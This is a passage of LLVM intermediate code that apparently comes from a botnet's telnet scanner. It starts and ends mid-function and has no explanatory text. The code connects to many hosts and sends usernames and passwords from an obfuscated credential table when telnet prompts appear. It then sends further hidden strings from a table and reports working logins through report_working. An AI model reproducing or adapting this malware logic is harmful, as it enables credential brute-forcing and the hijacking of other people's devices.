  %132 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %56) #10, !srcloc !5
  store i32 0, i32* %1, align 4
  br label %133

; <label>:133:                                    ; preds = %.thread, %.thread206
  %.0188234 = phi i32 [ 0, %.thread ], [ %.1189, %.thread206 ]
  %.0190233 = phi i32 [ 0, %.thread ], [ %.1191, %.thread206 ]
  %storemerge197232 = phi i32 [ 0, %.thread ], [ %190, %.thread206 ]
  %134 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %135 = sext i32 %storemerge197232 to i64
  %136 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %134, i64 %135
  %137 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %134, i64 %135, i32 3
  %138 = load i32, i32* %137, align 8
  %139 = icmp eq i32 %138, 0
  br i1 %139, label %.thread206, label %140

; <label>:140:                                    ; preds = %133
  %141 = icmp ne i32 %138, 1
  %142 = select i1 %141, i32 30, i32 5
  %143 = load i32, i32* @fake_time, align 4
  %144 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %134, i64 %135, i32 2
  %145 = load i32, i32* %144, align 4
  %146 = sub i32 %143, %145
  %147 = icmp ugt i32 %146, %142
  br i1 %147, label %148, label %162

; <label>:148:                                    ; preds = %140
  %149 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %134, i64 %135, i32 1
  %150 = load i32, i32* %149, align 8
  %151 = call i32 @close(i32 %150) #10
  store i32 -1, i32* %149, align 8
  %152 = load i32, i32* %137, align 8
  %153 = icmp ugt i32 %152, 2
  %154 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %134, i64 %135, i32 8
  br i1 %153, label %155, label %161

; <label>:155:                                    ; preds = %148
  %156 = load i8, i8* %154, align 8
  %157 = add i8 %156, 1
  store i8 %157, i8* %154, align 8
  %158 = icmp eq i8 %157, 10
  br i1 %158, label %159, label %160

; <label>:159:                                    ; preds = %155
  store i8 0, i8* %154, align 8
  store i32 0, i32* %137, align 8
  br label %.thread206

; <label>:160:                                    ; preds = %155
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %136)
  br label %.thread206

; <label>:161:                                    ; preds = %148
  store i8 0, i8* %154, align 8
  store i32 0, i32* %137, align 8
  br label %.thread206

; <label>:162:                                    ; preds = %140
  %.pr = load i32, i32* %137, align 8
  switch i32 %.pr, label %176 [
    i32 1, label %163
    i32 0, label %.thread206
  ]

; <label>:163:                                    ; preds = %162
  %164 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %134, i64 %135, i32 1
  %165 = load i32, i32* %164, align 8
  %166 = srem i32 %165, 64
  %167 = zext i32 %166 to i64
  %168 = shl i64 1, %167
  %169 = sdiv i32 %165, 64
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %3, i64 0, i32 0, i64 %170
  %172 = load i64, i64* %171, align 8
  %173 = or i64 %168, %172
  store i64 %173, i64* %171, align 8
  %174 = load i32, i32* %164, align 8
  %175 = icmp sgt i32 %174, %.0190233
  %..0190 = select i1 %175, i32 %174, i32 %.0190233
  br label %.thread206

; <label>:176:                                    ; preds = %162
  %177 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %134, i64 %135, i32 1
  %178 = load i32, i32* %177, align 8
  %179 = srem i32 %178, 64
  %180 = zext i32 %179 to i64
  %181 = shl i64 1, %180
  %182 = sdiv i32 %178, 64
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %2, i64 0, i32 0, i64 %183
  %185 = load i64, i64* %184, align 8
  %186 = or i64 %181, %185
  store i64 %186, i64* %184, align 8
  %187 = load i32, i32* %177, align 8
  %188 = icmp sgt i32 %187, %.0188234
  %..0188 = select i1 %188, i32 %187, i32 %.0188234
  br label %.thread206

.thread206:                                       ; preds = %133, %176, %163, %162, %161, %160, %159
  %.1191 = phi i32 [ %.0190233, %159 ], [ %.0190233, %160 ], [ %.0190233, %161 ], [ %..0190, %163 ], [ %.0190233, %162 ], [ %.0190233, %176 ], [ %.0190233, %133 ]
  %.1189 = phi i32 [ %.0188234, %159 ], [ %.0188234, %160 ], [ %.0188234, %161 ], [ %.0188234, %163 ], [ %.0188234, %162 ], [ %..0188, %176 ], [ %.0188234, %133 ]
  %189 = load i32, i32* %1, align 4
  %190 = add nsw i32 %189, 1
  store i32 %190, i32* %1, align 4
  %191 = icmp slt i32 %190, 256
  br i1 %191, label %133, label %192

; <label>:192:                                    ; preds = %.thread206
  store i64 0, i64* %57, align 8
  store i64 1, i64* %58, align 8
  %193 = icmp sgt i32 %.1191, %.1189
  %194 = select i1 %193, i32 %.1191, i32 %.1189
  %195 = add nsw i32 %194, 1
  %196 = call i32 @select(i32 %195, %struct.fd_set.26* nonnull %2, %struct.fd_set.26* nonnull %3, %struct.fd_set.26* null, %struct.timeval.27* nonnull %4) #10
  %197 = call i64 @time(i64* null) #10
  %198 = trunc i64 %197 to i32
  store i32 %198, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %199

; <label>:199:                                    ; preds = %192, %.loopexit
  %storemerge198236 = phi i32 [ 0, %192 ], [ %404, %.loopexit ]
  %200 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %201 = sext i32 %storemerge198236 to i64
  %202 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201
  %203 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 1
  %204 = load i32, i32* %203, align 8
  %205 = icmp eq i32 %204, -1
  br i1 %205, label %.loopexit, label %206

; <label>:206:                                    ; preds = %199
  %207 = sdiv i32 %204, 64
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %3, i64 0, i32 0, i64 %208
  %210 = load i64, i64* %209, align 8
  %211 = srem i32 %204, 64
  %212 = zext i32 %211 to i64
  %213 = shl i64 1, %212
  %214 = and i64 %210, %213
  %215 = icmp eq i64 %214, 0
  br i1 %215, label %232, label %216

; <label>:216:                                    ; preds = %206
  store i32 0, i32* %6, align 4
  store i32 4, i32* %7, align 4
  %217 = load i32, i32* %203, align 8
  %218 = call i32 @getsockopt(i32 %217, i32 1, i32 4, i8* nonnull %59, i32* nonnull %7) #10
  %219 = load i32, i32* %6, align 4
  %220 = or i32 %219, %218
  %221 = icmp eq i32 %220, 0
  br i1 %221, label %222, label %227

; <label>:222:                                    ; preds = %216
  %223 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 3
  store i32 2, i32* %223, align 8
  %224 = call fastcc %struct.scanner_auth* @random_auth_entry()
  %225 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %202, i64 0, i32 0
  store %struct.scanner_auth* %224, %struct.scanner_auth** %225, align 8
  %226 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 6
  store i32 0, i32* %226, align 4
  br label %232

; <label>:227:                                    ; preds = %216
  %228 = load i32, i32* %203, align 8
  %229 = call i32 @close(i32 %228) #10
  store i32 -1, i32* %203, align 8
  %230 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 8
  store i8 0, i8* %230, align 8
  %231 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 3
  store i32 0, i32* %231, align 8
  br label %.loopexit

; <label>:232:                                    ; preds = %206, %222
  %233 = load i32, i32* %203, align 8
  %234 = sdiv i32 %233, 64
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %2, i64 0, i32 0, i64 %235
  %237 = load i64, i64* %236, align 8
  %238 = srem i32 %233, 64
  %239 = zext i32 %238 to i64
  %240 = shl i64 1, %239
  %241 = and i64 %240, %237
  %242 = icmp eq i64 %241, 0
  br i1 %242, label %.loopexit, label %.thread210.preheader

.thread210.preheader:                             ; preds = %232
  %243 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 3
  %244 = load i32, i32* %243, align 8
  %245 = icmp eq i32 %244, 0
  br i1 %245, label %.loopexit, label %.lr.ph235

.lr.ph235:                                        ; preds = %.thread210.preheader
  %246 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 6
  %247 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 7, i64 0
  %248 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 7, i64 64
  %249 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 7, i64 0
  %250 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 2
  %251 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %202, i64 0, i32 0
  %252 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %202, i64 0, i32 0
  %253 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 8
  %254 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 4
  %255 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 5
  %256 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %202, i64 0, i32 0
  br label %259

.thread210.loopexitthread-pre-split:              ; preds = %395
  %.pr249 = load i32, i32* %243, align 8
  br label %.thread210.loopexit

.thread210.loopexit.loopexit:                     ; preds = %287
  br label %.thread210.loopexit

.thread210.loopexit:                              ; preds = %.thread210.loopexit.loopexit, %.thread210.loopexitthread-pre-split
  %257 = phi i32 [ %.pr249, %.thread210.loopexitthread-pre-split ], [ %288, %.thread210.loopexit.loopexit ]
  %258 = icmp eq i32 %257, 0
  br i1 %258, label %.loopexit.loopexit, label %259

; <label>:259:                                    ; preds = %.lr.ph235, %.thread210.loopexit
  %260 = load i32, i32* %246, align 4
  %261 = icmp eq i32 %260, 256
  br i1 %261, label %262, label %265

; <label>:262:                                    ; preds = %259
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %247, i8* nonnull %248, i64 192, i32 1, i1 false)
  %263 = load i32, i32* %246, align 4
  %264 = add nsw i32 %263, -64
  store i32 %264, i32* %246, align 4
  br label %265

; <label>:265:                                    ; preds = %262, %259
  store i32 0, i32* %72, align 4
  %266 = load i32, i32* %203, align 8
  %267 = load i32, i32* %246, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 7, i64 %268
  %270 = sub nsw i32 256, %267
  %271 = call i32 @recv_strip_null(i32 %266, i8* %269, i32 %270, i32 16384)
  switch i32 %271, label %283 [
    i32 0, label %.thread212
    i32 -1, label %272
  ]

.thread212:                                       ; preds = %265
  store i32 104, i32* %72, align 4
  br label %274

; <label>:272:                                    ; preds = %265
  %.pr211 = load i32, i32* %72, align 4
  %273 = icmp eq i32 %.pr211, 11
  br i1 %273, label %.loopexit, label %274

; <label>:274:                                    ; preds = %.thread212, %272
  %275 = load i32, i32* %203, align 8
  %276 = call i32 @close(i32 %275) #10
  store i32 -1, i32* %203, align 8
  %277 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 8
  %278 = load i8, i8* %277, align 8
  %279 = add i8 %278, 1
  store i8 %279, i8* %277, align 8
  %280 = icmp ugt i8 %279, 9
  br i1 %280, label %281, label %282

; <label>:281:                                    ; preds = %274
  store i8 0, i8* %277, align 8
  store i32 0, i32* %243, align 8
  br label %.loopexit

; <label>:282:                                    ; preds = %274
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %202)
  br label %.loopexit

; <label>:283:                                    ; preds = %265
  %284 = load i32, i32* %246, align 4
  %285 = add nsw i32 %284, %271
  store i32 %285, i32* %246, align 4
  %286 = load i32, i32* @fake_time, align 4
  store i32 %286, i32* %250, align 4
  br label %287

; <label>:287:                                    ; preds = %.thread208, %283
  %288 = load i32, i32* %243, align 8
  switch i32 %288, label %.thread210.loopexit.loopexit [
    i32 2, label %289
    i32 3, label %293
    i32 4, label %307
    i32 5, label %321
    i32 6, label %332
    i32 7, label %343
    i32 8, label %354
    i32 9, label %365
    i32 10, label %376
  ]

; <label>:289:                                    ; preds = %287
  %290 = call fastcc i32 @consume_iacs(%struct.scanner_connection* nonnull %202)
  %291 = icmp sgt i32 %290, 0
  br i1 %291, label %292, label %395

; <label>:292:                                    ; preds = %289
  store i32 3, i32* %243, align 8
  br label %.thread208

; <label>:293:                                    ; preds = %287
  %294 = call fastcc i32 @consume_user_prompt(%struct.scanner_connection* nonnull %202)
  %295 = icmp sgt i32 %294, 0
  br i1 %295, label %296, label %395

; <label>:296:                                    ; preds = %293
  %297 = load i32, i32* %203, align 8
  %298 = load %struct.scanner_auth*, %struct.scanner_auth** %251, align 8
  %299 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %298, i64 0, i32 0
  %300 = load i8*, i8** %299, align 8
  %301 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %298, i64 0, i32 4
  %302 = load i8, i8* %301, align 4
  %303 = zext i8 %302 to i64
  %304 = call i64 @send(i32 %297, i8* %300, i64 %303, i32 16384) #10
  %305 = load i32, i32* %203, align 8
  %306 = call i64 @send(i32 %305, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 2, i32 16384) #10
  store i32 4, i32* %243, align 8
  br label %.thread208

; <label>:307:                                    ; preds = %287
  %308 = call fastcc i32 @consume_pass_prompt(%struct.scanner_connection* nonnull %202)
  %309 = icmp sgt i32 %308, 0
  br i1 %309, label %310, label %395

; <label>:310:                                    ; preds = %307
  %311 = load i32, i32* %203, align 8
  %312 = load %struct.scanner_auth*, %struct.scanner_auth** %252, align 8
  %313 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %312, i64 0, i32 1
  %314 = load i8*, i8** %313, align 8
  %315 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %312, i64 0, i32 5
  %316 = load i8, i8* %315, align 1
  %317 = zext i8 %316 to i64
  %318 = call i64 @send(i32 %311, i8* %314, i64 %317, i32 16384) #10
  %319 = load i32, i32* %203, align 8
  %320 = call i64 @send(i32 %319, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 2, i32 16384) #10
  store i32 5, i32* %243, align 8
  br label %.thread208

; <label>:321:                                    ; preds = %287
  %322 = call fastcc i32 @consume_any_prompt(%struct.scanner_connection* nonnull %202)
  %323 = icmp sgt i32 %322, 0
  br i1 %323, label %324, label %395

; <label>:324:                                    ; preds = %321
  call void @table_unlock_val(i8 zeroext 5)
  %325 = call i8* @table_retrieve_val(i32 5, i32* nonnull %8)
  %326 = load i32, i32* %203, align 8
  %327 = load i32, i32* %8, align 4
  %328 = sext i32 %327 to i64
  %329 = call i64 @send(i32 %326, i8* %325, i64 %328, i32 16384) #10
  %330 = load i32, i32* %203, align 8
  %331 = call i64 @send(i32 %330, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 2, i32 16384) #10
  call void @table_lock_val(i8 zeroext 5)
  store i32 6, i32* %243, align 8
  br label %.thread208

; <label>:332:                                    ; preds = %287
  %333 = call fastcc i32 @consume_any_prompt(%struct.scanner_connection* nonnull %202)
  %334 = icmp sgt i32 %333, 0
  br i1 %334, label %335, label %395

; <label>:335:                                    ; preds = %332
  call void @table_unlock_val(i8 zeroext 6)
  %336 = call i8* @table_retrieve_val(i32 6, i32* nonnull %9)
  %337 = load i32, i32* %203, align 8
  %338 = load i32, i32* %9, align 4
  %339 = sext i32 %338 to i64
  %340 = call i64 @send(i32 %337, i8* %336, i64 %339, i32 16384) #10
  %341 = load i32, i32* %203, align 8
  %342 = call i64 @send(i32 %341, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 2, i32 16384) #10
  call void @table_lock_val(i8 zeroext 6)
  store i32 7, i32* %243, align 8
  br label %.thread208

; <label>:343:                                    ; preds = %287
  %344 = call fastcc i32 @consume_any_prompt(%struct.scanner_connection* nonnull %202)
  %345 = icmp sgt i32 %344, 0
  br i1 %345, label %346, label %395

; <label>:346:                                    ; preds = %343
  call void @table_unlock_val(i8 zeroext 4)
  %347 = call i8* @table_retrieve_val(i32 4, i32* nonnull %10)
  %348 = load i32, i32* %203, align 8
  %349 = load i32, i32* %10, align 4
  %350 = sext i32 %349 to i64
  %351 = call i64 @send(i32 %348, i8* %347, i64 %350, i32 16384) #10
  %352 = load i32, i32* %203, align 8
  %353 = call i64 @send(i32 %352, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 2, i32 16384) #10
  call void @table_lock_val(i8 zeroext 4)
  store i32 8, i32* %243, align 8
  br label %.thread208

; <label>:354:                                    ; preds = %287
  %355 = call fastcc i32 @consume_any_prompt(%struct.scanner_connection* nonnull %202)
  %356 = icmp sgt i32 %355, 0
  br i1 %356, label %357, label %395

; <label>:357:                                    ; preds = %354
  call void @table_unlock_val(i8 zeroext 7)
  %358 = call i8* @table_retrieve_val(i32 7, i32* nonnull %11)
  %359 = load i32, i32* %203, align 8
  %360 = load i32, i32* %11, align 4
  %361 = sext i32 %360 to i64
  %362 = call i64 @send(i32 %359, i8* %358, i64 %361, i32 16384) #10
  %363 = load i32, i32* %203, align 8
  %364 = call i64 @send(i32 %363, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 2, i32 16384) #10
  call void @table_lock_val(i8 zeroext 7)
  store i32 9, i32* %243, align 8
  br label %.thread208

; <label>:365:                                    ; preds = %287
  %366 = call fastcc i32 @consume_any_prompt(%struct.scanner_connection* nonnull %202)
  %367 = icmp sgt i32 %366, 0
  br i1 %367, label %368, label %395

; <label>:368:                                    ; preds = %365
  call void @table_unlock_val(i8 zeroext 8)
  %369 = call i8* @table_retrieve_val(i32 8, i32* nonnull %12)
  %370 = load i32, i32* %203, align 8
  %371 = load i32, i32* %12, align 4
  %372 = sext i32 %371 to i64
  %373 = call i64 @send(i32 %370, i8* %369, i64 %372, i32 16384) #10
  %374 = load i32, i32* %203, align 8
  %375 = call i64 @send(i32 %374, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 2, i32 16384) #10
  call void @table_lock_val(i8 zeroext 8)
  store i32 10, i32* %243, align 8
  br label %.thread208

; <label>:376:                                    ; preds = %287
  %377 = call fastcc i32 @consume_resp_prompt(%struct.scanner_connection* nonnull %202)
  %378 = icmp eq i32 %377, -1
  br i1 %378, label %379, label %387

; <label>:379:                                    ; preds = %376
  %380 = load i32, i32* %203, align 8
  %381 = call i32 @close(i32 %380) #10
  store i32 -1, i32* %203, align 8
  %382 = load i8, i8* %253, align 8
  %383 = add i8 %382, 1
  store i8 %383, i8* %253, align 8
  %384 = icmp eq i8 %383, 10
  br i1 %384, label %385, label %386

; <label>:385:                                    ; preds = %379
  store i8 0, i8* %253, align 8
  store i32 0, i32* %243, align 8
  br label %.thread208

; <label>:386:                                    ; preds = %379
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %202)
  br label %.thread208

; <label>:387:                                    ; preds = %376
  %388 = icmp sgt i32 %377, 0
  br i1 %388, label %389, label %395

; <label>:389:                                    ; preds = %387
  %390 = load i32, i32* %254, align 4
  %391 = load i16, i16* %255, align 8
  %392 = load %struct.scanner_auth*, %struct.scanner_auth** %256, align 8
  call fastcc void @report_working(i32 %390, i16 zeroext %391, %struct.scanner_auth* %392)
  %393 = load i32, i32* %203, align 8
  %394 = call i32 @close(i32 %393) #10
  store i32 -1, i32* %203, align 8
  store i32 0, i32* %243, align 8
  br label %.thread208

; <label>:395:                                    ; preds = %387, %365, %354, %343, %332, %321, %307, %293, %289
  %.0192 = phi i32 [ %377, %387 ], [ %366, %365 ], [ %355, %354 ], [ %344, %343 ], [ %333, %332 ], [ %322, %321 ], [ %308, %307 ], [ %294, %293 ], [ %290, %289 ]
  %396 = icmp eq i32 %.0192, 0
  br i1 %396, label %.thread210.loopexitthread-pre-split, label %.thread208

.thread208:                                       ; preds = %292, %296, %310, %324, %335, %346, %357, %368, %389, %386, %385, %395
  %.0192209 = phi i32 [ %.0192, %395 ], [ %290, %292 ], [ %294, %296 ], [ %308, %310 ], [ %322, %324 ], [ %333, %335 ], [ %344, %346 ], [ %355, %357 ], [ %366, %368 ], [ %377, %389 ], [ -1, %386 ], [ -1, %385 ]
  %397 = load i32, i32* %246, align 4
  %398 = icmp sgt i32 %.0192209, %397
  %..0192 = select i1 %398, i32 %397, i32 %.0192209
  %399 = sub nsw i32 %397, %..0192
  store i32 %399, i32* %246, align 4
  %400 = sext i32 %..0192 to i64
  %401 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %200, i64 %201, i32 7, i64 %400
  %402 = sext i32 %399 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %249, i8* %401, i64 %402, i32 1, i1 false)
  br label %287

.loopexit.loopexit:                               ; preds = %.thread210.loopexit
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.thread210.preheader, %272, %232, %282, %281, %199, %227
  %403 = load i32, i32* %1, align 4
  %404 = add nsw i32 %403, 1
  store i32 %404, i32* %1, align 4
  %405 = icmp slt i32 %404, 256
  br i1 %405, label %199, label %.loopexit213.loopexit
}

declare i32 @util_local_addr() local_unnamed_addr #3

declare void @rand_init() local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_auth_entry(i8*, i8*, i16 zeroext) unnamed_addr #0 {
  %4 = alloca i32, align 4
  %5 = load i8*, i8** bitcast (%struct.scanner_auth** @auth_table to i8**), align 8
  %6 = load i32, i32* @auth_table_len, align 4
  %7 = add nsw i32 %6, 1
  %8 = sext i32 %7 to i64
  %9 = mul nsw i64 %8, 24
  %10 = tail call i8* @realloc(i8* %5, i64 %9) #10
  store i8* %10, i8** bitcast (%struct.scanner_auth** @auth_table to i8**), align 8
  %11 = call fastcc i8* @deobf(i8* %0, i32* nonnull %4)
  %12 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %13 = load i32, i32* @auth_table_len, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %12, i64 %14, i32 0
  store i8* %11, i8** %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %19 = load i32, i32* @auth_table_len, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %18, i64 %20, i32 4
  store i8 %17, i8* %21, align 4
  %22 = call fastcc i8* @deobf(i8* %1, i32* nonnull %4)
  %23 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %24 = load i32, i32* @auth_table_len, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %23, i64 %25, i32 1
  store i8* %22, i8** %26, align 8
  %27 = load i32, i32* %4, align 4
  %28 = trunc i32 %27 to i8
  %29 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %30 = load i32, i32* @auth_table_len, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %29, i64 %31, i32 5
  store i8 %28, i8* %32, align 1
  %33 = load i16, i16* @auth_table_max_weight, align 2
  %34 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %29, i64 %31, i32 2
  store i16 %33, i16* %34, align 8
  %35 = add i16 %33, %2
  %36 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %37 = load i32, i32* @auth_table_len, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* @auth_table_len, align 4
  %39 = sext i32 %37 to i64
  %40 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %36, i64 %39, i32 3
  store i16 %35, i16* %40, align 2
  %41 = load i16, i16* @auth_table_max_weight, align 2
  %42 = add i16 %41, %2
  store i16 %42, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @setup_connection(%struct.scanner_connection*) unnamed_addr #0 {
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = bitcast %struct.sockaddr_in* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 16, i32 4, i1 false)
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 1
  %5 = load i32, i32* %4, align 8
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %1
  %8 = tail call i32 @close(i32 %5) #10
  br label %9

; <label>:9:                                      ; preds = %1, %7
  %10 = tail call i32 @socket(i32 2, i32 1, i32 0) #10
  store i32 %10, i32* %4, align 8
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %32, label %12

; <label>:12:                                     ; preds = %9
  %13 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  store i32 0, i32* %13, align 4
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  tail call void @util_zero(i8* %14, i32 256) #10
  %15 = load i32, i32* %4, align 8
  %16 = tail call i32 (i32, i32, ...) @fcntl(i32 %15, i32 3, i32 0) #10
  %17 = or i32 %16, 2048
  %18 = tail call i32 (i32, i32, ...) @fcntl(i32 %15, i32 4, i32 %17) #10
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %21 = load i32, i32* %20, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  store i32 %21, i32* %22, align 4
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 5
  %24 = load i16, i16* %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = load i32, i32* @fake_time, align 4
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 2
  store i32 %26, i32* %27, align 4
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 3
  store i32 1, i32* %28, align 8
  %29 = load i32, i32* %4, align 8
  %30 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %31 = call i32 @connect(i32 %29, %struct.sockaddr* nonnull %30, i32 16) #10
  br label %32

; <label>:32:                                     ; preds = %9, %12
  ret void
}

declare i32 @select(i32, %struct.fd_set.26*, %struct.fd_set.26*, %struct.fd_set.26*, %struct.timeval.27*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc %struct.scanner_auth* @random_auth_entry() unnamed_addr #5 {
  %1 = load i32, i32* @auth_table_len, align 4
  %2 = icmp sgt i32 %1, 0
  br i1 %2, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %0
  %3 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %4 = load i32, i32* @auth_table_len, align 4
  %5 = sext i32 %4 to i64
  br label %6

; <label>:6:                                      ; preds = %.lr.ph, %14
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %14 ]
  %7 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %3, i64 %indvars.iv, i32 2
  %8 = load i16, i16* %7, align 8
  %9 = icmp eq i16 %8, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %6
  %11 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %3, i64 %indvars.iv, i32 3
  %12 = load i16, i16* %11, align 2
  %13 = icmp eq i16 %12, 0
  br i1 %13, label %14, label %._crit_edge9

; <label>:14:                                     ; preds = %10, %6
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %15 = icmp slt i64 %indvars.iv.next, %5
  br i1 %15, label %6, label %._crit_edge.loopexit

._crit_edge9:                                     ; preds = %10
  %16 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %3, i64 %indvars.iv
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %14
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %._crit_edge9, %0
  %.0 = phi %struct.scanner_auth* [ %16, %._crit_edge9 ], [ null, %0 ], [ null, %._crit_edge.loopexit ]
  ret %struct.scanner_auth* %.0
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) local_unnamed_addr #0 {
  %5 = sext i32 %2 to i64
  %6 = tail call i64 @recv(i32 %0, i8* %1, i64 %5, i32 %3) #10
  %7 = trunc i64 %6 to i32
